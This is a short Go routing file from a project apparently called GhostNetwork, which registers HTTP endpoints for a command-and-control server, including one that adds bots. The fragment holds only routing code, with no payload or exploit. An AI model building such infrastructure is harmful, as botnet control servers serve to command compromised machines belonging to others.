package router

import (
	"github.com/bienkma/GhostNetwork/cnc_server/handler"
	"github.com/bienkma/GhostNetwork/cnc_server/router/middleware"
	"github.com/go-chi/chi"
)

// Register create new router
func Register(r *chi.Mux, botServer *handler.BotServer) {
	r.Use(middleware.LoggingMiddleware)
	r.Group(func(r chi.Router) {
		r.Get("/apis/about", handler.IndexHandler)
		r.Get("/apis/ip", handler.IPHandler)
		r.Get("/apis/add", botServer.AddBot)
	})
}
